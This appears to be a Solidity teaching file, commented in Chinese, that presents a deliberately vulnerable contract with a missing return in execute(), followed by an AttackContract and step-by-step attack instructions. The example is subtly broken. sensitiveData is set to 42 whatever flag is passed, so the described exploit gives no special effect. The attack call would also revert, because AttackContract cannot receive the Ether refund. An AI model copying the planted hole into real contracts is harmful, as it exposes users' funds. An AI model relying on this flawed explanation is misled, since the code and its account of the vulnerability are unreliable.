// SPDX-License-Identifier: UNLICENSED
// Vulnerable Solidity Code (Incorrect Control Flow) - 修正版本之前的漏洞示範
// 此版本包含原有漏洞，但修正了明顯的編譯錯誤，透過正確的類型轉換。
// 漏洞描述：在 execute 函式中，當 _flag 為1時，原本應該執行 return 中止後續敏感操作，但因為遺漏 return 導致 sensitiveData 還是被修改。

pragma solidity >=0.8.0;

contract VulnerableContract {
    // 敏感狀態變數，僅在特定情況下才應被更改
    uint public sensitiveData;

    // execute 函式根據 _flag 決定操作流程
    function execute(uint _flag) public payable {
        if(_flag == 1) {
            // 漏洞重點：
            // 當 _flag 為1時，本該在回傳 Ether 後中止後續流程，但因未使用 return，後續敏感操作仍被執行。
            payable(msg.sender).transfer(msg.value); // 回傳傳入的 Ether 給呼叫者
            // 遺漏 return; 使得 sensitiveData 之後仍被更新
        }
        // 敏感操作：本應只在 _flag != 1 時執行
        sensitiveData = 42; 
    }

    // 接收 Ether 的 fallback 功能
    receive() external payable {}
}

// 攻擊合約：利用錯誤的控制流程進行攻擊
contract AttackContract {
    VulnerableContract public vulnerable;

    // 建構子中修正地址轉換問題，將 non-payable address 轉換為 payable address
    constructor(address _vulnerableAddress) {
        // 解法：強制轉換 _vulnerableAddress 為 payable address
        vulnerable = VulnerableContract(payable(_vulnerableAddress));
    }

    // 攻擊步驟：
    // 1. 攻擊者呼叫 attack 並傳送 Ether，同時設定 _flag 為1。
    // 2. 由於缺少 return，導致 sensitiveData 被修改，實現攻擊效果。
    function attack() external payable {
        vulnerable.execute{value: msg.value}(1);
    }
}

/*
部署與攻擊說明：
1. 部署 VulnerableContract 合約。
2. 部署 AttackContract 合約時，傳入 VulnerableContract 的地址(必須使用 payable address 調整，看起來不影響漏洞示範)。
3. 呼叫 AttackContract.attack 並傳入 Ether，由於 _flag=1 卻沒有 return，因此即使回傳 Ether，sensitiveData 還是被設定為 42，模擬了控制流程錯誤利用的情形。
*/
